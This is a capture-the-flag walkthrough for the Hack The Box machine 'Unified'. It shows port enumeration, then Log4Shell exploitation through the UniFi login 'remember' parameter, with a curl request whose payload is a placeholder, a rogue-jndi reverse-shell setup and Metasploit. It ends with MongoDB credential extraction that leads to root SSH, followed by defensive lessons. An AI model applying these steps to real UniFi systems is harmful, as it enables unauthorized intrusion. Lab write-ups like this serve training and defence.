---
title: "Unified — Hack The Box Walkthrough"
description: "Exploiting Log4Shell on UniFi Network Application for RCE and escalating to root on Unified."
date: 2026-09-02
category: offensive
readTime: "6 min read"
mitre:
  - "T1190"
  - "T1068"
tags:
  - "Hack The Box"
  - "Log4Shell"
  - "CVE-2021-44228"
  - "UniFi"
  - "MongoDB"
  - "Linux"
  - "CTF"
summary: "Exploiting Log4Shell on UniFi Network Application for RCE and escalating to root on Unified."
---

**Machine:** Unified
**Difficulty:** Easy
**Key Techniques:** Log4Shell (CVE-2021-44228), UniFi, MongoDB, SSH

---

## Enumeration

### Port Scanning

```
22/tcp    open  ssh
6789/tcp  open  ibm-db2-admin
8080/tcp  open  http-proxy   (redirects to /manage)
8443/tcp  open  https-alt    UniFi Network Application
8843/tcp  open  unknown      UniFi portal
8880/tcp  open  cddbp-alt
```

The SSL certificate identifies the app as **UniFi** (Ubiquiti Inc.). Port 8443 redirects to `/manage`, the **UniFi Network Application**.

---

## Exploitation — Log4Shell (CVE-2021-44228)

Some UniFi bundles Log4j, vulnerable to **Log4Shell** — unauthenticated RCE via the login `remember` parameter:

```bash
curl -i -s -k -X POST \
  'https://10.129.96.149/api/login' \
  --data 'remember=<payload>&password=x&username=x'
```

Serve a malicious LDAP/RMI server with `rogue-jndi` to load a reverse-shell class. Catch a shell as `unifi`.

> **Note:** I used **Metasploit**'s Log4j module to gain the initial shell.

```
user.txt: <flag>
```

---

## Privilege Escalation

### MongoDB Credentials

UniFi stores account hashes and config in local MongoDB:

```bash
mongo --port 27117 ace
db.admin.find().pretty()
```

Crack/use the admin hash to reveal credentials reused for `root` SSH:

```bash
ssh root@10.129.96.149
```

```
root.txt: <flag>
```

---

## Lessons Learned

1. **Keep UniFi and all Java apps patched** — Log4Shell was a supply-chain catastrophe easily abused for unauthenticated RCE.
2. **Never expose management consoles** like UniFi directly to the internet; use VPN or an authenticated reverse proxy.
3. **Do not reuse the admin password** for the OS `root` account.
